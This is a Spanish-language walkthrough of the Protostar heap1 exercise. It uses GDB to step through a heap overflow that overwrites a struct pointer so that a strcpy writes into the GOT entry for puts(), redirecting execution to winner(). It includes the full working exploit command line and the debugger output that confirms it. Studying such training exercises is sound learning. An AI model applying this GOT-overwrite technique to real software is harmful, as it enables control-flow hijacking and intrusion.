				EXPLOIT
user@protostar:/tmp$ ./heap1 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1531265693




            	WRITEUP- BASIC HEAP EXPLOITATION & INTRODUCCION A GDB
1. Abrimos nuestro GDB y le ponemos una sintaxis para Intel
(gdb) set disassembly-flavor intel
(gdb) disassemble main


2. Colocamos bp despues de cada llamada a las funciones
(gdb) break *0x080484ce
Breakpoint 1 at 0x80484ce: file heap1/heap1.c, line 23.
(gdb) break *0x080484e8
Breakpoint 2 at 0x80484e8: file heap1/heap1.c, line 25.
(gdb) break *0x080484fd
Breakpoint 3 at 0x80484fd: file heap1/heap1.c, line 27.
(gdb) break *0x08048517
Breakpoint 4 at 0x8048517: file heap1/heap1.c, line 29.
(gdb) break *0x0804853d
Breakpoint 5 at 0x804853d: file heap1/heap1.c, line 32.
(gdb) break *0x0804855a
Breakpoint 6 at 0x804855a: file heap1/heap1.c, line 34.


3.Ejecutamos con el exploit pasandose como argumento

(gdb) r $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
Breakpoint 1, 0x080484ce in main (argc=3, argv=0xbffff834) at heap1/heap1.c:23


4. Justo aqui estamos despues de llamada a i1 = malloc(sizeof(struct internet)), vamos a ver que sucede en los registros:
(gdb) info register
eax            0x804a008	134520840
ecx            0xb7fd93a0	-1208118368
edx            0x804a000	134520832
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff760	0xbffff760
ebp            0xbffff788	0xbffff788
esi            0x0	0
edi            0x0	0
eip            0x80484ce	0x80484ce <main+21>

Ok!, vemos que justo en el registro $eax tenemos el valor de retorno de la funcion sabiendo esto, esta sera la direccion de memoria donde comienza nuestro almacenamiento en memoria del heap. 

Bien ahora haciendo mapeo vemos cuanto tenemos disponible en memoria para heap.
(gdb) info proc mappings
process 3477
cmdline = '/opt/protostar/bin/heap1'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap1'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
	 0x804a000  0x806b000    0x21000          0           [heap]

Nice, ahora vamos a ver los 8 Bytes para localizar nuestro data
(gdb) x/2xw 0x804a008
0x804a008:	0x00000000	0x00000000

Sabemos que los 8 primeros bytes son chunk header, y los otros 8 para chunk data por eso nuestra direccion es +8.

Vemos un vistazo rapido nuestro heap. 
(gdb) x/64xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000


5. Breakpoint 2, 0x080484e8 in main (argc=3, argv=0xbffff834) at heap1/heap1.c:25

OK, ahora estamos despues de la llamada a la otra función i1->priority = 1
Si vemos el desensamblado tenemos justo el valor int=1 de priority (ver:source).
(gdb) x/8xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x00000000
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000

OK, vamos a setear variables con GDB para tener facil acceso

(gdb) set $i1 = (struct internet*)0x804a008
(gdb) print $i1
$1 = (struct internet *) 0x804a008
(gdb) print *$i1
$2 = {priority = 1, name = 0x0}

Vemos como priority es uno, pero aun name es cero eso es debido a que todavia no esta asignada en memoria su localizacion.

6. Breakpoint 3, 0x080484fd in main (argc=3, argv=0xbffff834) at heap1/heap1.c:27
Si desensamblamos ahora tenemos la direccion de memoria en los ultimos 4 Bytes

(gdb) x/8xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
(gdb) print *$i1
$3 = {priority = 1, name = 0x804a018 ""}

Ahora justo estamos en "i2=malloc(sizeof(struct internet))"
Si vemos el valor del registro $eax tiene de nuevo el valor de retorno de la funcion malloc(). Ese valor de retorno es justo el la direccion de memoria donde almacenar el data, como paso con i1.
(gdb) info registers 
eax            0x804a028	134520872
ecx            0xb7fd93a0	-1208118368

(gdb) print *$i2
$4 = {priority = 0, name = 0x0}


7. Breakpoint 4, 0x08048517 in main (argc=3, argv=0xbffff834) at heap1/heap1.c:29
(gdb) x/24xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x00000000
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000

Ahi vemos nuestro 2!!! Justo como deberia de ser segun el codigo fuente: i2->priority = 2
(gdb) print *$i2
$5 = {priority = 2, name = 0x0}

Cool, ahora tenemos que ver que significa este valor: 0x00020fc1 es la longitud del heap restante sin allocar.

De momento "name" aun no tiene ningun string de i1:
    0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
Y lo mismo sucede con i2:
    0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000


8. Breakpoint 5, main (argc=3, argv=0xbffff834) at heap1/heap1.c:32
Ok, ahora es cuando strcpy(i1->name, argv[1]) copiara lo introducido por el argumento a name.
Si lo desensamblamos parece ser que nos hemos pasado de los 4 Bytes que se supone que se tenian asignado. Que ha pasado? WTF

(gdb) x/24xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x42424242
0x804a020:	0x43434343	0x44444444	0x45454545	0x08049774
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) print *$i1
$6 = {priority = 1, name = 0x804a018 "AAAABBBBCCCCDDDDEEEEt\227\004\b"}
(gdb) print *$i2
$7 = {priority = 1162167621, name = 0x8049774 "҃\004\b"}

Oki hemos sobreescrito la variable priority de i2, por 1162167621, que en hexadecimal es 0x45454545
Pero lo peor es que hemos sobrescrito el siguiente chunk data correspondiente a la direccion que apunta a i2->name....pero ya no apunta mas a ese sitio, ¿que ha pasado? Si nos fijamos bien esa direccion apunta a la GOT de la funcion puts()

(gdb) print $i2->name
$8 = 0x8049774 "҃\004\b"
(gdb) x $i2->name
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2

Simplemente modificando una direccion de memoria en Heap hemos escrito apuntando a donde nosotros queramos. Awesome, hemos modificado el flujo de ejecucion de codigo a donde nosotros queriamos.

Si desensamblamos main y vemos la llamada a puts vemos el mismo resultado que nuestro exploit:
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
0x08048566 <main+173>:	leave
0x08048567 <main+174>:	ret
End of assembler dump.
(gdb) disassemble 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:	push   0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
End of assembler dump.
(gdb) x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2
(gdb)


                                        PoC
Ok enviamos el buffer por GDB y justo en el dest del strcpy coindice con nuestras FFFF del primer argumento
(gdb) r $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFF"') $(python -c 'print "1111"')
Starting program: /opt/protostar/bin/heap1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFF"') $(python -c 'print "1111"')

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff990 "1111")
    at strcpy.c:40
40	strcpy.c: No such file or directory.
	in strcpy.c

Ahora tenemos que cambiar esas FFFF por la GOT de puts() y asi redirijir la ejecucion de codigo a donde nosotros queramos ya que tendremos control de $eip.

(gdb) r $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "1111"')
Starting program: /opt/protostar/bin/heap1 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "1111"')

Program received signal SIGSEGV, Segmentation fault.
0x31313131 in ?? ()
(gdb)

Cool, justo $eip apunta a nuestros "1111" del segundo argumento por lo que si ahora en vez de 1111 ponemos la direccion de memoria de winner(), ya lo tenemos hecho :)

(gdb) r $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
Starting program: /opt/protostar/bin/heap1 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1531265218

